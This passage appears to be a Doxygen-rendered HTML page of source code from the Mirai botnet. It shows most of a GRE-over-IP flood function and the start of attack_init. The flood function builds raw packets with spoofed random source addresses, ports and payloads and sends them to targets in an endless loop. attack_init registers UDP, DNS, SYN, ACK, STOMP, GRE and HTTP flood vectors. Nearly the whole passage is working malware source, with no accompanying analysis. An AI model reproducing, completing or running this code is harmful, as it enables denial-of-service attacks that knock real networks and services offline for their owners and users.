</span>udphdr *)(greiph + 1);</div><div class="line"><a name="l00064"></a><span class="lineno">   64</span>&#160;</div><div class="line"><a name="l00065"></a><span class="lineno">   65</span>&#160;        <span class="comment">// IP header init</span></div><div class="line"><a name="l00066"></a><span class="lineno">   66</span>&#160;        iph-&gt;version = 4;</div><div class="line"><a name="l00067"></a><span class="lineno">   67</span>&#160;        iph-&gt;ihl = 5;</div><div class="line"><a name="l00068"></a><span class="lineno">   68</span>&#160;        iph-&gt;tos = ip_tos;</div><div class="line"><a name="l00069"></a><span class="lineno">   69</span>&#160;        iph-&gt;tot_len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structgrehdr.html">grehdr</a>) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + data_len);</div><div class="line"><a name="l00070"></a><span class="lineno">   70</span>&#160;        iph-&gt;id = htons(ip_ident);</div><div class="line"><a name="l00071"></a><span class="lineno">   71</span>&#160;        iph-&gt;ttl = ip_ttl;</div><div class="line"><a name="l00072"></a><span class="lineno">   72</span>&#160;        <span class="keywordflow">if</span> (dont_frag)</div><div class="line"><a name="l00073"></a><span class="lineno">   73</span>&#160;            iph-&gt;frag_off = htons(1 &lt;&lt; 14);</div><div class="line"><a name="l00074"></a><span class="lineno">   74</span>&#160;        iph-&gt;protocol = IPPROTO_GRE;</div><div class="line"><a name="l00075"></a><span class="lineno">   75</span>&#160;        iph-&gt;saddr = source_ip;</div><div class="line"><a name="l00076"></a><span class="lineno">   76</span>&#160;        iph-&gt;daddr = targs[i].addr;</div><div class="line"><a name="l00077"></a><span class="lineno">   77</span>&#160;</div><div class="line"><a name="l00078"></a><span class="lineno">   78</span>&#160;        <span class="comment">// GRE header init</span></div><div class="line"><a name="l00079"></a><span class="lineno">   79</span>&#160;        greh-&gt;<a class="code" href="structgrehdr.html#a97d844ebd5716285f25c57931bc67423">protocol</a> = htons(ETH_P_IP); <span class="comment">// Protocol is 2 bytes</span></div><div class="line"><a name="l00080"></a><span class="lineno">   80</span>&#160;</div><div class="line"><a name="l00081"></a><span class="lineno">   81</span>&#160;        <span class="comment">// Encapsulated IP header init</span></div><div class="line"><a name="l00082"></a><span class="lineno">   82</span>&#160;        greiph-&gt;version = 4;</div><div class="line"><a name="l00083"></a><span class="lineno">   83</span>&#160;        greiph-&gt;ihl = 5;</div><div class="line"><a name="l00084"></a><span class="lineno">   84</span>&#160;        greiph-&gt;tos = ip_tos;</div><div class="line"><a name="l00085"></a><span class="lineno">   85</span>&#160;        greiph-&gt;tot_len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + data_len);</div><div class="line"><a name="l00086"></a><span class="lineno">   86</span>&#160;        greiph-&gt;id = htons(~ip_ident);</div><div class="line"><a name="l00087"></a><span class="lineno">   87</span>&#160;        greiph-&gt;ttl = ip_ttl;</div><div class="line"><a name="l00088"></a><span class="lineno">   88</span>&#160;        <span class="keywordflow">if</span> (dont_frag)</div><div class="line"><a name="l00089"></a><span class="lineno">   89</span>&#160;            greiph-&gt;frag_off = htons(1 &lt;&lt; 14);</div><div class="line"><a name="l00090"></a><span class="lineno">   90</span>&#160;        greiph-&gt;protocol = IPPROTO_UDP;</div><div class="line"><a name="l00091"></a><span class="lineno">   91</span>&#160;        greiph-&gt;saddr = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00092"></a><span class="lineno">   92</span>&#160;        <span class="keywordflow">if</span> (gcip)</div><div class="line"><a name="l00093"></a><span class="lineno">   93</span>&#160;            greiph-&gt;daddr = iph-&gt;daddr;</div><div class="line"><a name="l00094"></a><span class="lineno">   94</span>&#160;        <span class="keywordflow">else</span></div><div class="line"><a name="l00095"></a><span class="lineno">   95</span>&#160;            greiph-&gt;daddr = ~(greiph-&gt;saddr - 1024);</div><div class="line"><a name="l00096"></a><span class="lineno">   96</span>&#160;</div><div class="line"><a name="l00097"></a><span class="lineno">   97</span>&#160;        <span class="comment">// UDP header init</span></div><div class="line"><a name="l00098"></a><span class="lineno">   98</span>&#160;        udph-&gt;source = htons(sport);</div><div class="line"><a name="l00099"></a><span class="lineno">   99</span>&#160;        udph-&gt;dest = htons(dport);</div><div class="line"><a name="l00100"></a><span class="lineno">  100</span>&#160;        udph-&gt;len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + data_len);</div><div class="line"><a name="l00101"></a><span class="lineno">  101</span>&#160;    }</div><div class="line"><a name="l00102"></a><span class="lineno">  102</span>&#160;</div><div class="line"><a name="l00103"></a><span class="lineno">  103</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00104"></a><span class="lineno">  104</span>&#160;    {</div><div class="line"><a name="l00105"></a><span class="lineno">  105</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00106"></a><span class="lineno">  106</span>&#160;        {</div><div class="line"><a name="l00107"></a><span class="lineno">  107</span>&#160;            <span class="keywordtype">char</span> *pkt = pkts[i];</div><div class="line"><a name="l00108"></a><span class="lineno">  108</span>&#160;            <span class="keyword">struct </span>iphdr *iph = (<span class="keyword">struct </span>iphdr *)pkt;</div><div class="line"><a name="l00109"></a><span class="lineno">  109</span>&#160;            <span class="keyword">struct </span><a class="code" href="structgrehdr.html">grehdr</a> *greh = (<span class="keyword">struct </span><a class="code" href="structgrehdr.html">grehdr</a> *)(iph + 1);</div><div class="line"><a name="l00110"></a><span class="lineno">  110</span>&#160;            <span class="keyword">struct </span>iphdr *greiph = (<span class="keyword">struct </span>iphdr *)(greh + 1);</div><div class="line"><a name="l00111"></a><span class="lineno">  111</span>&#160;            <span class="keyword">struct </span>udphdr *udph = (<span class="keyword">struct </span>udphdr *)(greiph + 1);</div><div class="line"><a name="l00112"></a><span class="lineno">  112</span>&#160;            <span class="keywordtype">char</span> *data = (<span class="keywordtype">char</span> *)(udph + 1);</div><div class="line"><a name="l00113"></a><span class="lineno">  113</span>&#160;</div><div class="line"><a name="l00114"></a><span class="lineno">  114</span>&#160;            <span class="comment">// For prefix attacks</span></div><div class="line"><a name="l00115"></a><span class="lineno">  115</span>&#160;            <span class="keywordflow">if</span> (targs[i].netmask &lt; 32)</div><div class="line"><a name="l00116"></a><span class="lineno">  116</span>&#160;                iph-&gt;daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>()) &gt;&gt; targs[i].netmask));</div><div class="line"><a name="l00117"></a><span class="lineno">  117</span>&#160;</div><div class="line"><a name="l00118"></a><span class="lineno">  118</span>&#160;            <span class="keywordflow">if</span> (source_ip == 0xffffffff)</div><div class="line"><a name="l00119"></a><span class="lineno">  119</span>&#160;                iph-&gt;saddr = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00120"></a><span class="lineno">  120</span>&#160;</div><div class="line"><a name="l00121"></a><span class="lineno">  121</span>&#160;            <span class="keywordflow">if</span> (ip_ident == 0xffff)</div><div class="line"><a name="l00122"></a><span class="lineno">  122</span>&#160;            {</div><div class="line"><a name="l00123"></a><span class="lineno">  123</span>&#160;                iph-&gt;id = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00124"></a><span class="lineno">  124</span>&#160;                greiph-&gt;id = ~(iph-&gt;id - 1000);</div><div class="line"><a name="l00125"></a><span class="lineno">  125</span>&#160;            }</div><div class="line"><a name="l00126"></a><span class="lineno">  126</span>&#160;            <span class="keywordflow">if</span> (sport == 0xffff)</div><div class="line"><a name="l00127"></a><span class="lineno">  127</span>&#160;                udph-&gt;source = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00128"></a><span class="lineno">  128</span>&#160;            <span class="keywordflow">if</span> (dport == 0xffff)</div><div class="line"><a name="l00129"></a><span class="lineno">  129</span>&#160;                udph-&gt;dest = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00130"></a><span class="lineno">  130</span>&#160;</div><div class="line"><a name="l00131"></a><span class="lineno">  131</span>&#160;            <span class="keywordflow">if</span> (!gcip)</div><div class="line"><a name="l00132"></a><span class="lineno">  132</span>&#160;                greiph-&gt;daddr = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00133"></a><span class="lineno">  133</span>&#160;            <span class="keywordflow">else</span></div><div class="line"><a name="l00134"></a><span class="lineno">  134</span>&#160;                greiph-&gt;daddr = iph-&gt;daddr;</div><div class="line"><a name="l00135"></a><span class="lineno">  135</span>&#160;</div><div class="line"><a name="l00136"></a><span class="lineno">  136</span>&#160;            <span class="keywordflow">if</span> (data_rand)</div><div class="line"><a name="l00137"></a><span class="lineno">  137</span>&#160;                <a class="code" href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a>(data, data_len);</div><div class="line"><a name="l00138"></a><span class="lineno">  138</span>&#160;</div><div class="line"><a name="l00139"></a><span class="lineno">  139</span>&#160;            iph-&gt;check = 0;</div><div class="line"><a name="l00140"></a><span class="lineno">  140</span>&#160;            iph-&gt;check = <a class="code" href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a>((uint16_t *)iph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00141"></a><span class="lineno">  141</span>&#160;</div><div class="line"><a name="l00142"></a><span class="lineno">  142</span>&#160;            greiph-&gt;check = 0;</div><div class="line"><a name="l00143"></a><span class="lineno">  143</span>&#160;            greiph-&gt;check = <a class="code" href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a>((uint16_t *)greiph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00144"></a><span class="lineno">  144</span>&#160;</div><div class="line"><a name="l00145"></a><span class="lineno">  145</span>&#160;            udph-&gt;check = 0;</div><div class="line"><a name="l00146"></a><span class="lineno">  146</span>&#160;            udph-&gt;check = <a class="code" href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a>(greiph, udph, udph-&gt;len, sizeof (<span class="keyword">struct</span> udphdr) + data_len);</div><div class="line"><a name="l00147"></a><span class="lineno">  147</span>&#160;</div><div class="line"><a name="l00148"></a><span class="lineno">  148</span>&#160;            targs[i].sock_addr.sin_family = AF_INET;</div><div class="line"><a name="l00149"></a><span class="lineno">  149</span>&#160;            targs[i].sock_addr.sin_addr.s_addr = iph-&gt;daddr;</div><div class="line"><a name="l00150"></a><span class="lineno">  150</span>&#160;            targs[i].sock_addr.sin_port = 0;</div><div class="line"><a name="l00151"></a><span class="lineno">  151</span>&#160;            sendto(fd, pkt, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structgrehdr.html">grehdr</a>) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + data_len, MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;targs[i].sock_addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00152"></a><span class="lineno">  152</span>&#160;        }</div><div class="line"><a name="l00153"></a><span class="lineno">  153</span>&#160;</div><div class="line"><a name="l00154"></a><span class="lineno">  154</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00155"></a><span class="lineno">  155</span>&#160;        <span class="keywordflow">if</span> (errno != 0)</div><div class="line"><a name="l00156"></a><span class="lineno">  156</span>&#160;            printf(<span class="stringliteral">&quot;errno = %d\n&quot;</span>, errno);</div><div class="line"><a name="l00157"></a><span class="lineno">  157</span>&#160;        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00158"></a><span class="lineno">  158</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00159"></a><span class="lineno">  159</span>&#160;    }</div><div class="line"><a name="l00160"></a><span class="lineno">  160</span>&#160;}</div><div class="ttc" id="loader_2src_2headers_2includes_8h_html_adccb5337cf206fe3eca7c4732f634bb9"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a></div><div class="ttdeci">uint16_t port_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00014">includes.h:14</a></div></div>
<div class="ttc" id="checksum_8c_html_a84522f5e663ea711a5ceafdf03e586ea"><div class="ttname"><a href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a></div><div class="ttdeci">uint16_t checksum_generic(uint16_t *addr, uint32_t count)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00009">checksum.c:9</a></div></div>
<div class="ttc" id="wget_8c_html_aa8318fbee111c5bde5952c63e894c962"><div class="ttname"><a href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a></div><div class="ttdeci">#define socket</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00047">wget.c:47</a></div></div>
<div class="ttc" id="wget_8c_html_a9c7f6d5331abb2692a876d5ee67474b7"><div class="ttname"><a href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a></div><div class="ttdeci">#define close</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00052">wget.c:52</a></div></div>
<div class="ttc" id="attack_8h_html_acfa2ed8a557040aed04b6c9346aa0eb9"><div class="ttname"><a href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a></div><div class="ttdeci">#define ATK_OPT_IP_TTL</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00050">attack.h:50</a></div></div>
<div class="ttc" id="structgrehdr_html_a97d844ebd5716285f25c57931bc67423"><div class="ttname"><a href="structgrehdr.html#a97d844ebd5716285f25c57931bc67423">grehdr::protocol</a></div><div class="ttdeci">uint16_t protocol</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00022">protocol.h:22</a></div></div>
<div class="ttc" id="mirai_2bot_2includes_8h_html_aecb64c7238a325af454cf5e17d933ff2"><div class="ttname"><a href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a></div><div class="ttdeci">ipv4_t LOCAL_ADDR</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2includes_8h_source.html#l00031">includes.h:31</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="rand_8c_html_a11c986f4ca9d396a9bc68c0dd4b3903f"><div class="ttname"><a href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a></div><div class="ttdeci">void rand_str(char *str, int len)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00032">rand.c:32</a></div></div>
<div class="ttc" id="checksum_8c_html_a5144ab59500e01ed196ae6d8b4584c98"><div class="ttname"><a href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a></div><div class="ttdeci">uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00024">checksum.c:24</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_af492d2bddcb2befacb3aa03dcdf9aafd"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a></div><div class="ttdeci">char BOOL</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00011">includes.h:11</a></div></div>
<div class="ttc" id="rand_8c_html_accf5c4faf4fb7eb9d74bbf1764921b00"><div class="ttname"><a href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a></div><div class="ttdeci">uint32_t rand_next(void)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00021">rand.c:21</a></div></div>
<div class="ttc" id="attack_8h_html_a4d0115976f56267c42e6a09ff3651c02"><div class="ttname"><a href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a></div><div class="ttdeci">#define ATK_OPT_SPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00052">attack.h:52</a></div></div>
<div class="ttc" id="attack_8h_html_a47ac28075825da3fec16777b2395f331"><div class="ttname"><a href="attack_8h.html#a47ac28075825da3fec16777b2395f331">ATK_OPT_GRE_CONSTIP</a></div><div class="ttdeci">#define ATK_OPT_GRE_CONSTIP</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00065">attack.h:65</a></div></div>
<div class="ttc" id="attack_8h_html_ac8d9ef7cc50e5b0e43f50b087c4c7104"><div class="ttname"><a href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_RAND</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00047">attack.h:47</a></div></div>
<div class="ttc" id="attack_8h_html_a9b14feb6720fefac0c6da63a77da718e"><div class="ttname"><a href="attack_8h.html#a9b14feb6720fefac0c6da63a77da718e">ATK_OPT_SOURCE</a></div><div class="ttdeci">#define ATK_OPT_SOURCE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00071">attack.h:71</a></div></div>
<div class="ttc" id="attack_8h_html_a57162ecbd3f7644a8f6a6b58aa4f8596"><div class="ttname"><a href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a></div><div class="ttdeci">#define ATK_OPT_IP_DF</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00051">attack.h:51</a></div></div>
<div class="ttc" id="attack_8h_html_a1ac4210e00c74506c31642a74e3fc1c7"><div class="ttname"><a href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a></div><div class="ttdeci">#define ATK_OPT_IP_TOS</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00048">attack.h:48</a></div></div>
<div class="ttc" id="attack_8h_html_aacac129514ea3914af56b5eb4c71f8c6"><div class="ttname"><a href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_SIZE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00046">attack.h:46</a></div></div>
<div class="ttc" id="attack_8c_html_ab59e5bf31f63eeb001f8ec1278a15907"><div class="ttname"><a href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a></div><div class="ttdeci">int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00206">attack.c:206</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa93f0eb578d23995850d61f7d61c55c1"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a></div><div class="ttdeci">#define FALSE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00009">includes.h:9</a></div></div>
<div class="ttc" id="structgrehdr_html"><div class="ttname"><a href="structgrehdr.html">grehdr</a></div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00021">protocol.h:21</a></div></div>
<div class="ttc" id="attack_8h_html_ab8471c4c3e703d3c9ee4e971c48ba5fb"><div class="ttname"><a href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a></div><div class="ttdeci">#define ATK_OPT_DPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00053">attack.h:53</a></div></div>
<div class="ttc" id="attack_8h_html_aecb175215ca3d0ce5017cd8cedb7e0fe"><div class="ttname"><a href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a></div><div class="ttdeci">#define ATK_OPT_IP_IDENT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00049">attack.h:49</a></div></div>
<div class="ttc" id="protocol_8h_html_ad1a572736a10ff6b282c5f43c4ea1ccf"><div class="ttname"><a href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a></div><div class="ttdeci">uint16_t data_len</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00483">protocol.h:483</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="ad99d6dee9df7ab3929a42a3e011cbf3b"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname"><a class="el" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> attack_init </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00022">22</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8c_source.html#l00226">add_attack()</a>, <a class="el" href="attack_8h_source.html#l00038">ATK_VEC_ACK</a>, <a class="el" href="attack_8h_source.html#l00036">ATK_VEC_DNS</a>, <a class="el" href="attack_8h_source.html#l00041">ATK_VEC_GREETH</a>, <a class="el" href="attack_8h_source.html#l00040">ATK_VEC_GREIP</a>, <a class="el" href="attack_8h_source.html#l00044">ATK_VEC_HTTP</a>, <a class="el" href="attack_8h_source.html#l00039">ATK_VEC_STOMP</a>, <a class="el" href="attack_8h_source.html#l00037">ATK_VEC_SYN</a>, <a class="el" href="attack_8h_source.html#l00034">ATK_VEC_UDP</a>, <a class="el" href="attack_8h_source.html#l00043">ATK_VEC_UDP_PLAIN</a>, <a class="el" href="attack_8h_source.html#l00035">ATK_VEC_VSE</a>, <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>, <a class="el" href="attack__gre_8c_source.html#l00162">attack_gre_eth()</a>, <a class="el" href="attack__gre_8c_source.html#l00020">attack_gre_ip()</a>, <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>, <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>, <a class="el" href="attack__udp_8c_source.html#l00025">attack_udp_generic()</a>, <a class="el" href="attack__udp_8c_source.html#l00375">attack_udp_plain()</a>, <a class="el" href="attack__udp_8c_source.html#l00129">attack_udp_vse()</a>, and <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00010">TRUE</a>.</p>

<p>Referenced by <a class="el" href="mirai_2bot_2main_8c_source.html#l00047">main()</a>.</p>
<div class="fragment"><div class="line"><a name="l00023"></a><span class="lineno">   23</span>&#160;{</div><div class="line"><a name="l00024"></a><span class="lineno">   24</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00025"></a><span class="lineno">   25</span>&#160;</div><div class="line"><a name="l00026"></a><span class="lineno">   26</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#ae0f309784c914a61d84fd3988e3e7321">ATK_VEC_UDP</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#a793fdfa64aaad657551cc649e2988a81">attack_udp_generic</a>);</div><div class="line"><a name="l00027"></a><span class="lineno">   27</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#afa9c71242ff3032ca0a9b4f8053a9769">ATK_VEC_VSE</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#a12573f0d31b49ed03a25a6bee68cd37f">attack_udp_vse</a>);</div><div class="line"><a name="l00028"></a><span class="lineno">   28</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#acfffd96bfc135495f6d2dcf0b5c0345c">ATK_VEC_DNS</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#aa6e206675e668d9ef1a931bdac2cb42e">attack_udp_dns</a>);</div><div class="line"><a name="l00029"></a><span class="lineno">   29</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#a4f522d5241fa0355196c03eaa610c90f">ATK_VEC_UDP_PLAIN</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#a02ff8d6a614d729c46bae7cd348e511e">attack_udp_plain</a>);</div><div class="line"><a name="l00030"></a><span class="lineno">   30</span>&#160;</div><div class="line"><a name="l00031"></a><span class="lineno">   31</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#ad80bc552383b0999af6fa38e1718419c">ATK_VEC_SYN</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#a5fa5ce92d7cd276d0cf13922eddf1e6d">attack_tcp_syn</a>);</div><div class="line"><a name="l00032"></a><span class="lineno">   32</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#a5d6a088c0ce3645498a4870ccfd09a3c">ATK_VEC_ACK</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#a56a3bedfd2e2500ecdaff5edc2bcbc18">attack_tcp_ack</a>);</div><div class="line"><a name="l00033"></a><span class="lineno">   33</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#ad64add15bdc08f30c42b74a7af54c68b">ATK_VEC_STOMP</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#aff68f7c623b860ed728b0343b955e1a4">attack_tcp_stomp</a>);</div><div class="line"><a name="l00034"></a><span class="lineno">   34</span>&#160;</div><div class="line"><a name="l00035"></a><span class="lineno">   35</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#a3ac5365a0319b66a7a029342542156b6">ATK_VEC_GREIP</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#af64bc1071be075031eb42fc6635fd5fa">attack_gre_ip</a>);</div><div class="line"><a name="l00036"></a><span class="lineno">   36</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#af036d9269a58359f703ac0b2cece2187">ATK_VEC_GREETH</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#acffffc5cd4b1d6c59581a487a63edc07">attack_gre_eth</a>);</div><div class="line"><a name="l00037"></a><span class="lineno">   37</span>&#160;</div><div class="line"><a name="l00038"></a><span class="lineno">   38</span>&#160;    <span class="comment">//add_attack(ATK_VEC_PROXY, (ATTACK_FUNC)attack_app_proxy);</span></div><div class="line"><a name="l00039"></a><span class="lineno">   39</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#a8ced07abb18975692f26b538247550db">ATK_VEC_HTTP</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#a4b75221461ff0dc40c8199b5c2353a81">attack_app_http</a>);</div><div class="line"><a name="l00040"></a><span class="lineno">   40</span>&#160;</div><div class="line"><a name="l00041"></a><span class="lineno">   41</span>&#160;    <span 